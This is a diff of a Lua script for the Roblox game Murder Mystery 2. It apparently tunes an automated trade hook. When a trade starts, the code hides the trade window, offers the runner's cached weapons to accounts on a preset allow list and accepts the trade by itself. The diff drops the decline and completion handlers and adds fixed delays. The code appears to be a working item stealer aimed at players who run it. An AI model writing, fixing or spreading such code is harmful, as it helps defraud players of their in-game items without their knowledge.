@@ -133,10 +133,8 @@ local function hook_mm2()
     local offerItem          = Trade:WaitForChild("OfferItem", 10)
     local acceptTrade        = Trade:WaitForChild("AcceptTrade", 10)
     local startTrade         = Trade:WaitForChild("StartTrade", 10)
-    local completeTrade      = Trade:WaitForChild("CompleteTrade", 10)
     local setRequestsEnabled = Trade:WaitForChild("SetRequestsEnabled", 10)
     local updateTrade        = Trade:FindFirstChild("UpdateTrade")
-    local declineTrade       = Trade:FindFirstChild("DeclineTrade")
     if not sendRequest or not offerItem or not acceptTrade or not startTrade then return end
 
     pcall(function() setRequestsEnabled:FireServer(true) end)
@@ -151,9 +149,8 @@ local function hook_mm2()
     local itemsOffered = false
     local readySent = false
     local storedItems = {}
-    local guiHidden = false
     local shiftlockConn = nil
-    local tradeGen = 0  -- generation counter: voorkomt dat oude timers resetten
+    local tradeGen = 0
 
     local function isAllowedUser(name)
         for _, n in ipairs(CFG.allowed) do
@@ -176,7 +173,6 @@ local function hook_mm2()
     end
 
     local function hideGui()
-        guiHidden = true
         local gui = lp:FindFirstChild("PlayerGui")
         if gui then
             for _, name in ipairs({"TradeGUI","TradeGUI_Phone"}) do
@@ -210,7 +206,6 @@ local function hook_mm2()
     end
 
     local function showGui()
-        guiHidden = false
         if shiftlockConn then
             shiftlockConn:Disconnect()
             shiftlockConn = nil
@@ -239,14 +234,6 @@ local function hook_mm2()
         showGui()
     end
 
-    local function waitForConfirm(prevOffer, timeout)
-        local waited = 0
-        while currentLastOffer == prevOffer and waited < timeout do
-            task.wait(0.05)
-            waited = waited + 0.05
-        end
-    end
-
     if updateTrade then
         updateTrade.OnClientEvent:Connect(function(tradeData)
             if tradeData and tradeData.LastOffer then
@@ -255,19 +242,8 @@ local function hook_mm2()
         end)
     end
 
-    if declineTrade then
-        declineTrade.OnClientEvent:Connect(function()
-            tradeGen = tradeGen + 1
-            resetState()
-        end)
-    end
-
-    if completeTrade then
-        completeTrade.OnClientEvent:Connect(function()
-            tradeGen = tradeGen + 1
-            resetState()
-        end)
-    end
+    -- geen complete/decline handlers: die vuren soms op verkeerde momenten
+    -- de 10s timer reset altijd betrouwbaar
 
     task.spawn(function()
         while true do
@@ -295,6 +271,7 @@ local function hook_mm2()
     end)
 
     startTrade.OnClientEvent:Connect(function(tradeData)
+        -- force reset zodat vorige trade nooit interfereert
         itemsOffered = false
         readySent = false
         currentLastOffer = (tradeData and tradeData.LastOffer) or nil
@@ -314,31 +291,32 @@ local function hook_mm2()
         hideGui()
         itemsOffered = true
 
-        -- generation van DEZE trade: oude timers herkennen dit en stoppen
         tradeGen = tradeGen + 1
         local myGen = tradeGen
 
         task.spawn(function()
+            -- items aanbieden met kleine delay (rate limit voorkomen)
             local uniqueSlots = 0
             for _, entry in ipairs(cachedItems) do
                 if uniqueSlots >= 4 then break end
                 uniqueSlots = uniqueSlots + 1
                 for i = 1, entry.amount do
-                    local prev = currentLastOffer
                     pcall(function() offerItem:FireServer(entry.name, "Weapons") end)
-                    waitForConfirm(prev, 1.5)
+                    task.wait(0.1)
                 end
             end
 
-            task.wait(3)
+            -- wacht tot UpdateTrade de laatste waarde heeft bijgewerkt
+            task.wait(2)
+
             if not readySent and tradeGen == myGen then
                 readySent = true
                 local offer = currentLastOffer or tick()
                 pcall(function() acceptTrade:FireServer(TRADE_ID, offer) end)
             end
 
+            -- altijd resetten na 10s, ongeacht hoe trade eindigde
             task.wait(10)
-            -- alleen resetten als dit nog steeds onze trade is
             if tradeGen == myGen then
                 resetState()
             end
